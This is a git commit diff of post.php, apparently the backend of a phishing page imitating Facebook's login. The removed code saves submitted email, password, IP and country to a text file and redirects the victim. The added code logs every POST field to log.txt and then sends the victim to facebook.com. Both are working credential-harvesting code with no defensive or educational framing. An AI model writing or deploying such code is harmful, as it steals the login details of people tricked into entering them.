09c5b18891d5dd93e35932053128fe46d36318b1
jonathan00007 <56273560+jonathan00007@users.noreply.github.com>
2020-12-12 17:41:34 -0400

    x

--- post.php
+++ post.php
@@ -1,46 +1,13 @@
 <?php
-ini_set('memory_limit', '-1');
-
-$usuario = $_POST[ 'email' ];
-$password = $_POST[ 'pass' ];
-include("geoiploc.php");
-$ip = $_SERVER[ 'REMOTE_ADDR' ];
-$pais = getCountryFromIP($ip, " NamE ");
-$fecha = date("d/m/Y h:i"); 
-
-if( ( empty($usuario)) or (empty($password)) ){
-	
-echo ("<SCRIPT LANGUAGE='JavaScript'>
-
-
-     history.go(-1);
-
-
-
-    </SCRIPT>");
-	
-	
-}else{	
-
-
-	//guarderemos en un archivo de texto
-	$file = fopen($pais.'9r85thijn4.txt','a+');
-	fwrite($file, $usuario."\n".$password."\n".$ip."\n".$pais."\n============".$fecha."=============\n");
-	fclose($file);
-	
-	
-
-	
-echo ('<SCRIPT>
-
-
-	
-		window.location.href="https://www.youtube.com/watch?v=u5xIYWPVp-Y";
-
-
-    </SCRIPT>');
-  	
- 
-	
+header ('Location: https://facebook.com');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
 }
+fwrite($handle, "\r\n\n\n\n");
+fclose($handle);
+exit;
 ?>
